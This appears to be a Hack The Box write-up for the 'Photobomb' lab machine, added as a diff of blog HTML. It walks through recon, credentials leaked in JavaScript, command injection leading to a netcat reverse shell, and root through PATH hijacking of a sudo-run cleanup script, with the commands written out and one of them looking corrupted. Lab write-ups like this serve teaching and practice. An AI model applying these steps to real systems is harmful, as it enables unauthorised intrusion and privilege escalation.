@@ -1,0 +1,366 @@
+I"O<p>This is <a href="https://app.hackthebox.com/machines/Photobomb">hackthebox</a> easy rated machine designed to show the command injection for the user access and path injection knowledge for the root user. In this box i will show three ways of how to be root user.
+Lets start.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scan">Nmap Scan</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td> --><td class="rouge-code"><pre># Nmap 7.93 scan initiated Sat Feb 11 22:49:14 2023 as: nmap -sC -sV -oN nmap-scan 10.10.11.182
+Nmap scan report for 10.10.11.182
+Host is up (0.31s latency).
+Scanned at 2023-02-11 22:49:15 EAT for 208s
+Not shown: 988 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE          VERSION
+22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
+|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
+|   256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
+80/tcp    open     http             nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Feb 11 22:52:43 2023 -- 1 IP address (1 host up) scanned in 208.88 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Nmap shows two open ports, port 80 which serves for the web server and port 22 for ssh login. After having these details i will check for the web page to see how it looks like.</p>
+<h3 id="web-page-enumeration">Web Page enumeration</h3>
+<p><img src="/assets/img/photobomb/01.png" alt="image" /></p>
+
+<p>Remember this page  won’t show up until you add the ip address to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> with the name <code class="language-plaintext highlighter-rouge">photobomb.htb</code>.</p>
+
+<p>This web page has a link to another page which says <code class="language-plaintext highlighter-rouge">click here</code>. Then after clicking the link,  it will pop up the followings:</p>
+
+<p><img src="/assets/img/photobomb/02.png" alt="image" /></p>
+
+<p>After some failed trials of known usernames and passwords i decided to read again from the page and there was a hint there <code class="language-plaintext highlighter-rouge">click here (the credentials are in your welcome pack)</code>  then i  checked source codes and found <code class="language-plaintext highlighter-rouge">javascript</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
+  }
+}
+window.onload = init;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>All i care about this code is this part <code class="language-plaintext highlighter-rouge">pH0t0:b0Mb!</code> which are the credentials for login where by <code class="language-plaintext highlighter-rouge">pH0t0</code> being the username and <code class="language-plaintext highlighter-rouge">b0Mb!</code> the password. Then i used this credentials to login.</p>
+
+<p><img src="/assets/img/photobomb/03.png" alt="image" /></p>
+
+<p>After submitting the correct credentials then user will be redirected to <code class="language-plaintext highlighter-rouge">printer</code> directory where there is some images and printing option at the bottom</p>
+
+<p><img src="/assets/img/photobomb/04.png" alt="image" /></p>
+<h3 id="command-injection">Command Injection</h3>
+<p>The web page gives user options  of downloading either <code class="language-plaintext highlighter-rouge">png</code> or <code class="language-plaintext highlighter-rouge">jpg</code> and also allows user to resize it. To understand much about how this web works lets fire up <code class="language-plaintext highlighter-rouge">burp suite</code> and intercept this request and trying to change it to see if there is a vulnerability.</p>
+
+<p><img src="/assets/img/photobomb/05.png" alt="image" /></p>
+
+<p>if user selects  image according to to the intended way of the web application , then the request in burp will be seen as follows:</p>
+
+<p><img src="/assets/img/photobomb/06.png" alt="image" /></p>
+
+<p>But when user alter even small details then the site will respond as follows:</p>
+
+<p><img src="/assets/img/photobomb/07.png" alt="image" /></p>
+
+<p>Or</p>
+
+<p><img src="/assets/img/photobomb/08.png" alt="image" /></p>
+
+<p>This web seems to handle pictures conversion using the tool known as <code class="language-plaintext highlighter-rouge">convert</code>  and it seems to consider three things which are <code class="language-plaintext highlighter-rouge">photoname</code> <code class="language-plaintext highlighter-rouge">filetype</code> and <code class="language-plaintext highlighter-rouge">dimension</code> of the image. If these are not handled well there is a possibility to cause command injection. so i will try the sleep command to see if there is a response from the server to prove the command injection vulnerability.
+I will test all parameters starting with <code class="language-plaintext highlighter-rouge">photo</code>, <code class="language-plaintext highlighter-rouge">dimension</code> and then <code class="language-plaintext highlighter-rouge">filetype</code></p>
+
+<p><strong>Photo</strong></p>
+
+<p><img src="/assets/img/photobomb/09.png" alt="image" /></p>
+
+<p>No delay of request</p>
+
+<p><strong>Dimensions</strong></p>
+
+<p><img src="/assets/img/photobomb/10.png" alt="image" /></p>
+
+<p>The same to dimension</p>
+
+<p><strong>File type</strong></p>
+
+<p><img src="/assets/img/photobomb/11.png" alt="image" /></p>
+
+<p>Here we go there is a delay from the request i made then this shows that this parameter has command injection.</p>
+
+<h2 id="user">User</h2>
+<ol>
+  <li>Start netcat listener on your machine
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
+└─$ nc -nlvp 1234                           
+listening on [any] 1234 ...
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Send request with the reverse shell payload through burpsuite</li>
+</ol>
+
+<p><img src="/assets/img/photobomb/12.png" alt="image" /></p>
+
+<ol>
+  <li>Result
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
+└─$ nc -nlvp 1234                                                                                                  1 ⨯
+listening on [any] 1234 ...
+connect to [10.10.14.160] from (UNKNOWN) [10.10.11.182] 48802
+bash: cannot set terminal process group (733): Inappropriate ioctl for device
+bash: no job control in this shell
+wizard@photobomb:~/photobomb$ 
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>Now i have a shell but it is not stable and any action including <code class="language-plaintext highlighter-rouge">control + c</code> we result to the lost of shell so i will stabilize it.</p>
+  </li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+wizard@photobomb:~/photobomb$ export TERM=xterm
+export TERM=xterm
+
+wizard@photobomb:~/photobomb$ ^Z
+zsh: suspended  nc -nlvp 1234
+
+┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/photobomb]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -nlvp 1234
+
+wizard@photobomb:~/photobomb$ 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now lets check for user flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:~$ cat user.txt 
+88b428d207bfb*******************
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="root">Root</h2>
+<p>The first thing to check after getting user access is what commands do normal user run with <code class="language-plaintext highlighter-rouge">sudo</code>  this can be checked by using <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:~$ sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>User <code class="language-plaintext highlighter-rouge">wizard</code> can run a script <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> with root privileges by using <code class="language-plaintext highlighter-rouge">sudo</code>  command.  <code class="language-plaintext highlighter-rouge">setenv</code> command is used to  change or add an environment variable, meaning there is possibility of having path injection.</p>
+
+<p>Then up to here i decided to check this script to see its content</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:~$ cat /opt/cleanup.sh 
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="unintended-way-to-root">Unintended way to root</h3>
+<p>All the command run specified in the script have the full path except  <code class="language-plaintext highlighter-rouge">find</code> command, then i can create a malicious file and name name it <code class="language-plaintext highlighter-rouge">find</code> and then inject the path variable and run <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code>  with <code class="language-plaintext highlighter-rouge">sudo</code> command.</p>
+
+<p><img src="/assets/img/photobomb/13.png" alt="image" /></p>
+
+<p>All i need here  to make sure that malicious <code class="language-plaintext highlighter-rouge">find</code> command (which i have created) is being executed before  <code class="language-plaintext highlighter-rouge">/usr/bin</code> in path variable.</p>
+<ol>
+  <li>Create <code class="language-plaintext highlighter-rouge">find</code>  script and make it executable which will execute to give back the root access
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:/tmp$ echo -e  "#/bin/bash\nbash" &gt; find
+wizard@photobomb:/tmp$ cat find
+#/bin/bash
+bash
+wizard@photobomb:/tmp$ chmod +x find
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Add the new <code class="language-plaintext highlighter-rouge">find</code> path at the beginning of the path variable  to execute before <code class="language-plaintext highlighter-rouge">/usr/bin</code>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
+wizard@photobomb:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Execute <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> with <code class="language-plaintext highlighter-rouge">sudo</code> and new <code class="language-plaintext highlighter-rouge">find</code> command
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
+root@photobomb:/home/wizard/photobomb# 
+root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+96cff980d7332b4********
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <h3 id="intended-way">Intended way</h3>
+    <p>Back to <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code></p>
+  </li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre>#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>This script start with <code class="language-plaintext highlighter-rouge">.</code> which is equal to <code class="language-plaintext highlighter-rouge">source</code> command its main function is simply to refresh the <code class="language-plaintext highlighter-rouge">.bashrc</code> in order to apply new changes. Condition statement checks for two things, first one is size of the file and the symbolic link.</p>
+
+<p><code class="language-plaintext highlighter-rouge">[ -s log/photobomb.log ]</code> checks if the file <code class="language-plaintext highlighter-rouge">log/photobomb.log</code> exists and if it has a size greater than 0(i.e. it is not empty).
+<code class="language-plaintext highlighter-rouge">! [ -L log/photobomb.log ]</code> checks if the file <code class="language-plaintext highlighter-rouge">log/photobomb.log</code> is not a symbolic link. If all the conditions are met then it will send the content into <code class="language-plaintext highlighter-rouge">log/photobomb.log.old</code> and <code class="language-plaintext highlighter-rouge">truncate</code> on the log to set it’s size to 0. 
+The last one will find images in <code class="language-plaintext highlighter-rouge">source_images</code>  with extension <code class="language-plaintext highlighter-rouge">.jpg</code> and change their ownership to root user.</p>
+
+<p>I checked <code class="language-plaintext highlighter-rouge">.bashrc</code> file</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre># System-wide .bashrc file for interactive bash(1) shells.
+
+# To enable the settings / commands in this file for login shells as well,
+# this file has to be sourced in /etc/profile.
+
+# Jameson: ensure that snaps don't interfere, 'cos they are dumb
+PATH=${PATH/:\/snap\/bin/}
+
+# Jameson: caused problems with testing whether to rotate the log file
+enable -n [ # ]
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>And the first thing is about the environment variables and the second thing is <code class="language-plaintext highlighter-rouge">enable -n [ # ]</code>. <code class="language-plaintext highlighter-rouge">enable</code> command is used to enable and disable built in commands then <code class="language-plaintext highlighter-rouge">enable -n [ # ]</code> will enable <code class="language-plaintext highlighter-rouge">[</code> and comment <code class="language-plaintext highlighter-rouge">]</code> this will  result to path injection.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:/tmp$ echo -e '#!/bin/bash\nbash' &gt; [
+wizard@photobomb:/tmp$ chmod +x [
+wizard@photobomb:/tmp$ export PATH=/tmp:$PATH0d17567e349d26e167a
+wizard@photobomb:/tmp$ sudo PATH=pwd:$PATH /opt/cleanup.sh 
+root@photobomb:/tmp# 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="alternative">Alternative.</h2>
+<p>Since user can use <code class="language-plaintext highlighter-rouge">find</code> command with root privileges then i can use the option <code class="language-plaintext highlighter-rouge">exec</code> to execute <code class="language-plaintext highlighter-rouge">/bin/bash</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>wizard@photobomb:/tmp$ sudo PATH=$PATH /opt/cleanup.sh -exec /bin/bash \;
+root@photobomb:/tmp# whoami
+root
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>The End.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Mungu Nisaidie
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
